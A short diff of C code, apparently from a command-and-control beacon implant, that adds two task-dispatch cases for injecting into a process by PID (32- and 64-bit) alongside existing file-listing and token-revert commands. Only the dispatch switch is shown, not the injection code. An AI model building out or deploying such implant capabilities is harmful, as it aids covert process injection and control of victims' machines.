@@ -127,6 +127,12 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_FILE_LIST:
 			FilesystemList(buffer, size);
 			break;
+		case COMMAND_INJECT_PID_PING:
+			InjectIntoPidAndPing(buffer, size, TRUE);
+			break;
+		case COMMAND_INJECTX64_PID_PING:
+			InjectIntoPidAndPing(buffer, size, FALSE);
+			break;
 		case COMMAND_TOKEN_REV2SELF:
 			BeaconRevertToken();
 			break;
